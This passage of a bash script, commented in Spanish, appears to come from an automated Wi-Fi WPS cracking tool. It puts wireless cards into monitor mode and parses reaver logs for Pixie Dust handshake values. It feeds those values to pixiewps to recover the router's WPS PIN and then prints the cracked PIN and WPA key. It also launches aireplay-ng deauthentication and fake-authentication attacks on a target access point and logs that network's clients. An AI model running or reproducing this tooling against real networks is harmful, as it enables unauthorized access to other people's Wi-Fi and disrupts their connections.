 if [ x$DRIVER = "xrt2570" ] || [ x"`iwpriv $iface 2>/dev/null | grep wpapsk`" != "x" ] && [ x"`iwpriv $iface 2>/dev/null | grep get_RaAP_Cfg`" = "x" ]
 then
     printf "$iface\t\tRalink 2570 USB\trt2570"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=rt2500,$iface,Ralink_g" >>$KISMET
         iwconfig $iface mode ad-hoc 2> /dev/null >/dev/null
         startStdIface $iface $CH
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprismheader`" != "x" ]
         then
             iwpriv $iface forceprismheader 1
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprism`" != "x" ]
         then
             iwpriv $iface forceprism 1
         fi
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xr8180" ] || [ x"`iwpriv $iface 2>/dev/null | grep debugtx`" != "x" ]
 then
     printf "$iface\t\tRTL8180/RTL8185\tr8180"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=rt8180,$iface,Realtek" >>$KISMET
         if [ $CH -lt 1000 ]
         then
             iwconfig $iface mode Monitor channel $CH
         else
             iwconfig $iface mode Monitor freq "$CH"000000
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep prismhdr`" != "x" ]
         then
            iwpriv $iface prismhdr 1 >/dev/null 2>&1
         fi
         ifconfig $iface up
         printf " (monitor mode enabled)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xr8187" ] || [ x"`iwpriv $iface 2>/dev/null | grep badcrc`" != "x" ]
 then
     printf "$iface\t\tRTL8187\t\tr8187"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=rt8180,$iface,Realtek" >>$KISMET
         if [ $CH -lt 1000 ]
         then
             iwconfig $iface mode Monitor channel $CH
         else
             iwconfig $iface mode Monitor freq "$CH"000000
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep rawtx`" != "x" ]
         then
             iwpriv $iface rawtx 1 >/dev/null 2>&1
         fi
         ifconfig $iface up
         printf " (monitor mode enabled)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xzd1211rw" ] || [ x"`iwpriv $iface 2>/dev/null | grep get_regdomain`" != "x" ]
 then
     printf "$iface\t\tZyDAS 1211\tzd1211rw"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=zd1211,$iface,ZyDAS" >>$KISMET
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xzd1211" ] || [ x"`iwpriv $iface 2>/dev/null | grep dbg_flag`" != "x" ]
 then
     printf "$iface\t\tZyDAS 1211\tzd1211"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=zd1211,$iface,ZyDAS" >>$KISMET
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xacx" ] || [ x"`iwpriv $iface 2>/dev/null | grep GetAcx1`" != "x" ]
 then
     printf "$iface\t\tTI ACX1xx\tacx"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=acx100,$iface,TI" >>$KISMET
         iwpriv $iface monitor 2 $CH 2> /dev/null >/dev/null
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xbcm43xx" ] || [ x"`iwpriv $iface 2>/dev/null | grep write_sprom`" != "x" ]
 then
     printf "$iface\t\tBroadcom\tbcm43xx"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=bcm43xx,$iface,broadcom" >>$KISMET
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
         ifconfig $iface up
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xislsm" ] || [ x"`iwpriv $iface 2>/dev/null | grep set_announcedpkt`" != "x" ]
 then
    printf "$iface\t\tPrismGT\t\tislsm"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
         startStdIface $iface $CH
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
     	stopStdIface $iface
    fi    
    echo
    continue

 fi


 if [ x$DRIVER = "xat76c503a" ] || [ x"`iwpriv $iface 2>/dev/null | grep set_announcedpkt`" != "x" ]
  then
     printf "$iface\t\tAtmel\t\tat76c503a"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
          startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
      then
      	 stopStdIface $iface
     fi     
     echo
     continue

 fi


 if [ x$DRIVER = "xndiswrapper" ] || [ x"`iwpriv $iface 2>/dev/null | grep ndis_reset`" != "x" ]
 then
     printf "$iface\t\tUnknown\t\tndiswrapper"
     if [ x$2 = x$iface ]
     then
         echo " (MONITOR MODE NOT SUPPORTED)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER != "x" ]
 then
     if [ x$CHIPSET = "x" ]
     then
         printf "$iface\t\tUNKNOWN\t\t$DRIVER"
     else
         printf "$iface\t\t$CHIPSET\t\t$DRIVER"
     fi

     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi

printf "$iface\t\tUnknown\t\tUnknown (MODO MONITOR NO COMPATIBLES)\n"

done

echo

if [ $UDEV_ISSUE != 0 ] ; then
	echo udev cambió el nombre del interfaz. Lea lo siguiente para una solución:
	echo http://www.aircrack-ng.org/doku.php?id=airmon-ng#interface_athx_number_rising_ath0_ath1_ath2...._ath45
	echo 
fi

}

#airmon-old_fn

#~~~~~~~~~~~~~~~~~fin  airmon-ng viejo fin ~~~~~~~~~~~~~~~~~~~~# 

#~~~~~~~~~~~~Empezar Pixie Dust Data analizador de secuencias Empezar~~~~~~~~~~~#

PDDSA_fn()
{

rm -f /tmp/Aquarius01
rm -f /tmp/Aquarius02
rm -f /tmp/Aquarius03
rm -f /tmp/Aquarius04
rm -f /tmp/nonseq.txt
rm -f /tmp/pixieseq.txt

killall -q pixiewps

######hacer que el directorio para la salida reaver #############

PKRCOR="00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:02"

PKRERR="02:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00"

PINNUM=0


## Get BSSID


BSSID=$(cat < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD | awk -F' ' '{ if(($2 == "Waiting") && ($4 = "beacon")) {print $6}}')

cat < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD | awk -F' ' '{ if(($1 == "[P]") && ($2 != "WPS")) {print $2" "$3" "$4}}' > /tmp/Aquarius01

cat < /tmp/Aquarius01 | awk -F' ' '{ if($1 != "Access") {print $1" "$2" "$3" "$4}}' > /tmp/Aquarius02

#Añadir Número de línea para la secuencia pixie data corriente

cat -n  /tmp/Aquarius02 > /tmp/Aquarius03

#eliminar los espacios en blanco de izquierda de la primera palabra

cat < /tmp/Aquarius03 | sed -e 's/^[ \t]*//' > /tmp/Aquarius04

# Buscar Si configurar primero con la posible finalización

cat < /tmp/Aquarius04 | awk -F' ' '{ if(($2 == "E-Hash2:")) {print $1}}' > /tmp/nonseq.txt

# Número Búsqueda línea para obtener más datos

# E-Hash2 líneas asignan las variables

#Contador Línea incrustar en awk

LNECNT=1

LINESTART=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)

# Para terminar el programa, si no Ehash2 encontró

LINENULL=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)

if [ ! -z $LINENULL ]; then

# Encuentra el número total de secuencias en el archivo

until [ -z  $LINESTART ]; do   

	LINESTART=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)
	LNECNT=$(($LNECNT + 1))

		done

LNECNT=$(($LNECNT -2))

LNEND=$(($LNECNT))

LNEND=$(($LNEND))

#Restablecer volver a la línea de un

LNECNT=1


#until [ $BADAT == 1 ]; do


# EHash2 Ferias finalización datos de marcha atrás para recoger el var duendecillo 

BADAT=ZZZ

until [ $BADAT == 1 ]; do

LINESTART=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)

SEQ_fn()

{

echo -e "$txtrst"

	if [ $LINESTART > 6  ]; then

SEQ7=$LINESTART

SEQ1=$(($SEQ7 -6 ))
SEQ2=$(($SEQ7 -5 ))
SEQ3=$(($SEQ7 -4 ))
SEQ4=$(($SEQ7 -3 ))
SEQ5=$(($SEQ7 -2 ))
SEQ6=$(($SEQ7 -1 ))
SEQ7=$(($SEQ7))

ENONCE=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ1 -F' ' '{ if(($1 == startlne) && ($2 == "E-Nonce:")) {print $3}}')

PKE=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ2 -F' ' '{ if(($1 == startlne) && ($2 == "PKE:")) {print $3}}')

RNONCE=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ3 -F' ' '{ if(($1 == startlne) && ($2 == "R-Nonce:")) {print $3}}')

PKR=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ4 -F' ' '{ if(($1 == startlne) && ($2 == "PKR:")) {print $3}}')

AUTHKEY=$(cat < /tmp/Aquarius04 |awk -v startlne=$SEQ5 -F' ' '{ if(($1 == startlne) && ($2 == "AuthKey:")) {print $3}}')

HASH1=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ6 -F' ' '{ if(($1 == startlne) && ($2 == "E-Hash1:")) {print $3}}')

HASH2=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ7 -F' ' '{ if(($1 == startlne) && ($2 == "E-Hash2:")) {print $3}}')

if [ "$PKR" == "$PKRERR" ]; then

		PKR=$PKRCOR

    		    fi

#echo "E-Nonce: = $ENONCE"
#echo "PKE: = $PKE"
#echo "R-Nonce: = $RNONCE" 
#echo "PKR: = $PKR"
#echo "AuthKey: = $AUTHKEY"
#echo "E-Hash1: = $HASH1"
#echo "E-Hash2: = $HASH2"

	fi

}

SEQ_fn

if [ ${#ENONCE} = 47  ] && [ ${#PKE} = 575 ] && [ ${#RNONCE} = 47  ] && [ ${#PKR} = 575 ] && [ ${#AUTHKEY} = 95 ] && [ ${#HASH1} = 95 ] && [ ${#HASH2} = 95  ]; then

echo ""
echo -e "$info Comprobación de secuencia de datos del polvo del duendecillo$yel $LNECNT$info."
sleep 1

	if [ ! -z $BSSID ]; then

	sleep 1

	pixiewps -v 3 --e-nonce $ENONCE --e-bssid $BSSID --pke $PKE --r-nonce $RNONCE --pkr $PKR --authkey $AUTHKEY --e-hash1 $HASH1 --e-hash2 $HASH2  2>&1 | tee /tmp/pixieseq.txt

			fi

	if [ -z $BSSID ]; then

	sleep 1

	pixiewps -v 3 --e-nonce $ENONCE --pke $PKE --r-nonce $RNONCE --pkr $PKR --authkey $AUTHKEY --e-hash1 $HASH1 --e-hash2 $HASH2  2>&1 | tee /tmp/pixieseq.txt

			fi

		BADAT=1
  		 
	else

		if [ $LNECNT -eq $LNEND ]; then

		BADAT=1
		echo -e "$info    Secuencias de datos Obligatorio Pixie agotados.$txtrst"
		
			fi

		if [ $LNECNT -lt  $LNEND ]; then
					
		LNECNT=$(($LNECNT + 1))
		echo ""
		echo -e "$info    Datos Pixie obligatorios incompletos tratar la siguiente secuencia.$txtrst"
		sleep 1
		BADAT=0

				fi

					fi

		done

pixieseq="/tmp/pixieseq.txt"

	if [ -f  /tmp/pixieseq.txt ]; then

PINFND=$(cat < /tmp/pixieseq.txt | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "pin:")) {print $2}}')

		fi

	if [ -z $PINFND ]; then

		PINFND=ZZZ

			fi

	if [ -f  /tmp/pixieseq.txt ]; then

PINFND=$(cat < /tmp/pixieseq.txt | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "pin:")) {print $2}}')

		fi

	if [ -z $PINFND ]; then

		PINFND=ZZZ

			fi

	if [ $PINFND != WPS ]; then

		clear

			fi
      

			fi

if [ -z  $LINENULL ]; then

echo ""
echo -e "$txtrst    WPS Pin Extraviado."
echo -e "$txtrst"

		fi

if [[ $LNELFT == 1 && $PINFND != WPS ]] || [[ $LNEND = 1 && $PINFND != WPS ]]; then

echo ""
echo -e "$txtrst    WPS Pin Extraviado."
echo -e "$txtrst"

		fi

if [[ $PINFND == WPS ]]; then

WPSPIN=$(cat < /tmp/pixieseq.txt | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "pin:")) {print $4}}')

echo ""
echo -e "$txtrst    WPS Pin Encontrado!"
echo ""
echo -e "$txtrst    WPS Pin = $WPSPIN"
echo ""
echo -e "$txtrst    Cargando WPS Pin en reaver"

		USE_PIN1=y
		WPS_PIN1=$WPSPIN
                WPS_COMTEST=y
		USE_PIXIE=n
		PIXIE_OVERIDE=1

echo -e "$txtrst"

		fi

sleep 5

}

#~~~~~~~~~~~~fin Pixie Dust Data analizador de secuencias fin~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~Empezar Hacer variables de dirección del monitor mac Empezar~~~~~~~~~~~#

MONMAC_fn()

{

# Quite el texto delante de cuerda

MONMAC0=$(ifconfig $MON | grep "$MON      Link encap:UNSPEC  HWaddr " | sed s/"$MON      Link encap:UNSPEC  HWaddr "//g)

# Acortar a la longitud de 17

MONMAC0=$(echo $MONMAC0 | awk '{print substr($0,0,17)}')

# Reemplazar - tablero con: dos puntos - Algunos programas no pueden aceptar el tablero

MONMAC0=$(echo $MONMAC0 | tr - :)

# Quite el texto delante de cuerda

MONMAC1=$(ifconfig $MON1 | grep "$MON1      Link encap:UNSPEC  HWaddr " | sed s/"$MON1      Link encap:UNSPEC  HWaddr "//g)

# Acortar a la longitud de 17

MONMAC1=$(echo $MONMAC1 | awk '{print substr($0,0,17)}')

# Reemplazar - tablero con: dos puntos - Algunos programas no pueden aceptar el tablero

MONMAC1=$(echo $MONMAC1 | tr - :)

# Quite el texto delante de cuerda

MONMAC2=$(ifconfig $MON2 | grep "$MON2      Link encap:UNSPEC  HWaddr " | sed s/"$MON2      Link encap:UNSPEC  HWaddr "//g)

# Acortar a la longitud de 17

MONMAC2=$(echo $MONMAC2 | awk '{print substr($0,0,17)}')

# Reemplazar - tablero con: dos puntos - Algunos programas no pueden aceptar el tablero

MONMAC2=$(echo $MONMAC2 | tr - :)

}

#~~~~~~~~~~~~~~fin Hacer variables de dirección del monitor mac fin~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Empezar Limpieza en ctrl-c Empezar~~~~~~~~~~~~~~~#
cleanup()

{
killall -q tkiptun-ng
killall -q airodump-ng
killall -q aireplay-ng
killall -q wash
killall -q reaver 
killall -q mdk3
# Depurar Eterm Puede causar un problema con otros programas
sleep .1
killall -q Eterm
# Depurar Eterm Puede causar un problema con otros programas

airmon-old_fn stop mon10 &> /dev/null
sleep .1
airmon-old_fn stop mon9 &> /dev/null
sleep .1
airmon-old_fn stop mon8 &> /dev/null
sleep .1
airmon-old_fn stop mon7 &> /dev/null
sleep .1
airmon-old_fn stop mon6 &> /dev/null
sleep .1
airmon-old_fn stop mon5 &> /dev/null
sleep .1
airmon-old_fn stop mon4 &> /dev/null
sleep .1
airmon-old_fn stop mon3 &> /dev/null
sleep .1
airmon-old_fn stop mon2 &> /dev/null
sleep .1
airmon-old_fn stop mon1 &> /dev/null
sleep .1
airmon-old_fn stop mon0 &> /dev/null

rm -f configlist.txt
rm -f /tmp/tarap*
rm -f /tmp/*-clients.txt
rm -f /tmp/test12345670
rm -f /tmp/CONFIGHOLD.txt
return $?

}

control_c()

{

echo " Termina el programa"
cleanup
sleep 3
exit $?

}

trap control_c SIGINT

#~~~~~~~~~~~~~~~fin Limpieza en ctrl-c fin~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Empezar Pin Encontrado Empezar~~~~~~~~~~~~~~~#

PINFOUND_fn()
{

	if [ -f  VARMAC_LOGS/$NAME1-$DATEFILE-$PAD ]; then

PINFND=$(cat < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "PIN:")) {print $3}}')

		fi

	if [ -z $PINFND ]; then

		PINFND=ZZZ

			fi
	
	if [[ $PINFND == PIN: ]]; then

WPSPIN=$(cat < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "PIN:")) {print $4}}')

WPAKEY=$(cat < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPA")) {print $4}}')

APSSID=$(cat < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "AP") && ($3 == "SSID:")) {print $4" "$5" "$6" "$7" "$8 }}')

echo ""
echo -e "$txtrst    Pin agrietado"
echo ""
echo -e "$txtrst    WPS Pin: = $WPSPIN"
echo -e "$txtrst    WPA Key: = $WPAKEY"
echo -e "$txtrst    AP SSID: = $APSSID"
echo""
echo -e "$txtrst    ver archivo VARMAC_LOGS/$NAME1-$DATEFILE-$PAD"
echo -e " "

control_c

		fi
}

#~~~~~~~~~~~~~~~fin Pin Encontrado fin~~~~~~~~~~~~~~~#


echo ""
echo ""
echo -e "  Borrado de todos los monitores, reaver, lavado, mdk3 y aireplay-ng etc - Por favor, espera."
killall -q tkiptun-ng
killall -q airodump-ng
killall -q aireplay-ng
killall -q wash
killall -q reaver 
killall -q mdk3
sleep .1
killall -q Eterm

####borrar todos los monitores ####

airmon-old_fn stop mon10 &> /dev/null
sleep .1
airmon-old_fn stop mon9 &> /dev/null
sleep .1
airmon-old_fn stop mon8 &> /dev/null
sleep .1
airmon-old_fn stop mon7 &> /dev/null
sleep .1
airmon-old_fn stop mon6 &> /dev/null
sleep .1
airmon-old_fn stop mon5 &> /dev/null
sleep .1
airmon-old_fn stop mon4 &> /dev/null
sleep .1
airmon-old_fn stop mon3 &> /dev/null
sleep .1
airmon-old_fn stop mon2 &> /dev/null
sleep .1
airmon-old_fn stop mon1 &> /dev/null
sleep .1
airmon-old_fn stop mon0 &> /dev/null

rm -f configlist.txt
rm -f /tmp/tarap02.txt
rm -f /tmp/tarap03.txt
rm -f /tmp/tarap04.txt
rm -f /tmp/tarap05.txt
rm -f /tmp/tarap06.txt
rm -f /tmp/tarap*
rm -f /tmp/*-clients.txt
rm -f /tmp/CONFIGHOLD.txt
clear


#~~~~~~~~~~~~~~~Empezar Encuentra cliente asociado Empezar~~~~~~~~~~~~~~~#

ASSOC_CLIENT_fn()

{

if [ ! -d "VARMAC_AIRCRACK" ]; then

    mkdir -p -m 700 VARMAC_AIRCRACK;

	fi


if [ -f  /tmp/tarap-01.csv ]; then

#Deja sólo las líneas con Posible data

cat < /tmp/tarap-01.csv | awk -F' ' '{print $1" "$7" "$8}' > /tmp/tarap01.txt

#Retire comas

cat < /tmp/tarap01.txt | awk -F"," '/1/ {print $1 $2 $3  }' > /tmp/tarap02.txt

#Pele hasta tres (3) entradas 

cat < /tmp/tarap02.txt | awk -F' ' '{ if((length($3) == 17 )) {print $0 }}' > /tmp/tarap03.txt

#Eliminar los datos es decir mon0 producidos por uno mismo de la lista

#Mover a mayúsculas para que coincida con la salida de texto aircrack-ng

MACRMV="$VARMAC"

MACRMV=$(echo $MACRMV | awk '{print toupper($0)}')

cat < /tmp/tarap03.txt | awk -v mon=$MACRMV -F' ' '{ if($1 != mon ) {print $0}}' > /tmp/tarap04.txt

#Retire todos menos objetivo

cat < /tmp/tarap04.txt | awk -v targetap=$TARGETAP1 -F' ' '{ if($3 == targetap) {print $0}}' > /tmp/tarap05.txt

#Imprimir ficha con el valor de datos simplemente podría eliminar if

#Encontrar el valor más alto

cat < /tmp/tarap05.txt | awk -v targetap=$TARGETAP1 -F' ' '{ if($3 == targetap) {print $2}}' > /tmp/tarap06.txt

#### Empieza a trabajar ###

#### Construir Historia de macs asociado####

if [ ! -f  "/root/VARMAC_AIRCRACK/$TARGETAP-client.txt" ]; then

	touch /root/VARMAC_AIRCRACK/$TARGETAP1-client.txt

	fi

if [ ! -f  "/root/VARMAC_AIRCRACK/$TARGETAP-client.txt" ]; then

	touch /tmp/$TARGETAP1-client.txt

	fi

MAXDAT=$(awk '{for(i=1;i<=NF;i++) if($i>maxval) maxval=$i;}; END { print maxval;}' /tmp/tarap06.txt)

CLIASO_MAX=$(cat < /tmp/tarap05.txt | awk -v maxdat=$MAXDAT -F' ' '{ if($2 == maxdat) {print $1}}')

cat < /tmp/tarap05.txt | awk -v maxdat=$MAXDAT -F' ' '{ if($2 != maxdat) { print $0 }}' > /tmp/tarap05a.txt

#Encontrar el valor medio de los tres primeros

cat < /tmp/tarap05a.txt | awk -v maxdat=$MAXDAT -F' ' '{ if($2 != maxdat) {print $2}}' > /tmp/tarap06a.txt

MAXDAT=$(awk '{for(i=1;i<=NF;i++) if($i>maxval) maxval=$i;}; END { print maxval;}' /tmp/tarap06a.txt)

CLIASO_MID=$(cat < /tmp/tarap05a.txt | awk -v maxdat=$MAXDAT -F' ' '{ if($2 == maxdat) {print $1}}')

cat < /tmp/tarap05a.txt | awk -v maxdat=$MAXDAT -F' ' '{ if($2 != maxdat) {print $0}}' > /tmp/tarap05b.txt

cat < /tmp/tarap05b.txt | awk -v maxdat=$MAXDAT -F' ' '{ if($2 != maxdat) {print $2}}' > /tmp/tarap06b.txt

MAXDAT=$(awk '{for(i=1;i<=NF;i++) if($i>maxval) maxval=$i;}; END { print maxval;}' /tmp/tarap06b.txt)

CLIASO_LOW=$(cat < /tmp/tarap05b.txt | awk -v maxdat=$MAXDAT -F' ' '{ if($2 == maxdat) {print $1}}')

#Escribe variables para registro histórico

	if [ ! -z $CLIASO_MAX ]; then

		echo "$CLIASO_MAX" >> /tmp/$TARGETAP1-client.txt

			fi

	if [ ! -z $CLIASO_MID ]; then

		echo "$CLIASO_MID" >> /tmp/$TARGETAP1-client.txt

			fi

	if [ ! -z $CLIASO_LOW ]; then

		echo "$CLIASO_LOW" >> /tmp/$TARGETAP1-client.txt

			fi

cat < /root/VARMAC_AIRCRACK/$TARGETAP1-client.txt >> /tmp/$TARGETAP1-client.txt

rm -f /root/VARMAC_AIRCRACK/$TARGETAP1-client.txt

cat < /tmp/$TARGETAP1-client.txt | sort -u > /root/VARMAC_AIRCRACK/$TARGETAP1-client.txt

rm -f /tmp/$TARGETAP1-client.txt


	if [ $MDKTYPE1 -lt 16 ]; then

echo ""
echo -e  "     Si un ataque de cierre de sesión EAPOL ha sido seleccionado en el archivo de configuración."
echo -e  "  Este tipo de ataque requiere que los clientes se asocien"
echo -e  "  Si no se ven los clientes tipo de ataque cambiará a DDOS"

		fi

######

echo ""
echo -e "$info   Para los clientes que se han visto asociados a $TARGETAP1 ver:$txtrst"
echo ""
echo -e "$txtrst  root/VARMAC_AIRCRACK/$TARGETAP1-client.txt"
echo ""
echo -e "$info   Los clientes asocian actualmente $TARGETAP1 se verá más adelante:$txtrst"
echo ""

#check var not null
if [ ! -z $CLIASO_MAX ]; then

echo -e "$txtst  $CLIASO_MAX"
echo "  $CLIASO_MID"
echo "  $CLIASO_LOW"

	else

	echo -e "$txtrst   No hay clientes están asociados actualmente $TARGETAP1"

		fi
######

fi

}

#~~~~~~~~~~~~~~~fin Encuentra cliente asociado fin~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Empezar Asociación Airodump Buscar Empezar~~~~~~~~~~~~~~# 

AIRDASSOC_fn()
{

#Escribir un archivo para comprobar si hay clientes asoc

#CLIENT_ASSOC=

# canal específico

if [[ $CHANNEL1 -gt 0 && $CHANNEL1 -le 14 ]]  && [[ $MDKTYPE1 -lt 16 ]]; then

Eterm -g 80x15-1+400 --cmod "red" --no-cursor  -T "Airodump-ng" -e sh -c "airodump-ng -c $CHANNEL1 --bssid $TARGETAP1 -w /tmp/tarap $MON" &

		fi

#Salto de canal Se apaga parece estar en conflicto w. reaver

#if [[ $CHANNEL1 -eq 0 ]] && [[ $MDKTYPE1 -lt 16 ]]; then

#Eterm -g 80x15-1+400 --cmod "red" --no-cursor  -T "Airodump-ng" -e sh -c "airodump-ng --bssid $TARGETAP1 -w /tmp/tarap $MON" &

#		fi

}

#~~~~~~~~~~~~~~~fin asociación airodump fin~~~~~~~~~~~~~~~#


#~~~~~~~~~~~~~~~Empezar Aireplay-ng Empezar~~~~~~~~~~~~~~~#

AIREPLAY_fn()
{

if [[ $CHANNEL1 -gt 0 && $CHANNEL1 -le 14 ]]  && [[ $USE_AIRE1 == y || $USE_AIRE1 == Y ]]; then

sleep 10

Eterm -g 80x5-1+220 --cmod "red" --no-cursor  -T "Aireplay-ng Reception Test/AP Activation" -e sh -c "aireplay-ng -1 10 -a $TARGETAP1 -q 4 $MON" &

sleep 1

#Eterm -g 80x3+1+400 --cmod "red" --no-cursor  -T "MAC filter bruteforce mode" -e sh -c "mdk3 $MON f -t $TARGETAP1 -f 99:99:99:99:99:9F" &

		fi

if [[ $CHANNEL1 -gt 0 && $CHANNEL1 -le 14 ]]  && [[ $USE_AIRE0 == y || $USE_AIRE0 == Y ]]; then

sleep 10

Eterm -g 80x5-1+400 --cmod "red" --no-cursor  -T "Aireplay-ng DEAUTH AP Activation" -e sh -c "aireplay-ng -0 10 -a $TARGETAP1 $MON" &

sleep 1

#	if [[ $USE_AIRE1 == n || $USE_AIRE1 == N ]]; then


#Eterm -g 80x3+1+400 --cmod "red" --no-cursor  -T "MAC filter bruteforce mode" -e sh -c "mdk3 $MON f -t $TARGETAP1 -f 99:99:99:99:99:9F" &

#	fi
		fi
}

#~~~~~~~~~~~~~~~fin Aireplay-ng fin~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Seleccione el dispositivo~~~~~~~~~~~~~~~#

SELECT_DEVICE_fn()
{

until  [ $DEVTEST == y ] || [ $DEVTEST == Y ]; do

airmon-old_fn | tee /tmp/airmontype.txt

airmontype=$(cat < /tmp/airmontype.txt | awk -F' ' '{ if(($1 == "Interface")) {print $1}}')


if [ -z $airmontype ]; then

      airmontype=ZZZ

	fi


echo "$airmontype"


 if [ $airmontype == Interface ]; then

echo -e  "$txtrst"
airmon-old_fn | tee airmon01.txt 

cat < airmon01.txt | awk -F' ' '{ if(($1 != "Interface")) {print $1}}' > airmon02.txt

cat < airmon02.txt | awk -F' ' '{ if(($1 != "")) {print $1}}' > airmon03.txt

  AIRMONNAME=$(cat airmon03.txt | nl -ba -w 1  -s ': ')

		fi


if [ $airmontype != Interface ]; then


echo -e  "$txtrst"
airmon-old_fn | tee airmon01.txt

cat < airmon01.txt | awk -F' ' '{ if(($2 != "Interface")) {print $2}}' > airmon02.txt

cat < airmon02.txt | awk -F' ' '{ if(($1 != "")) {print $2}}' > airmon03.txt

  AIRMONNAME=$(cat airmon03.txt | nl -ba -w 1  -s ': ')

		fi

echo ""
echo -e "$info Dispositivos encontrado por airmon-ng.$txtrst"
echo " "
echo "$AIRMONNAME" | sed 's/^/       /'
echo ""
echo -e "$inp    Ingrese el$yel número de línea$inp del dispositivo inalámbrico$yel ( wlan0, wlan1 etc)$inp para ser usado."
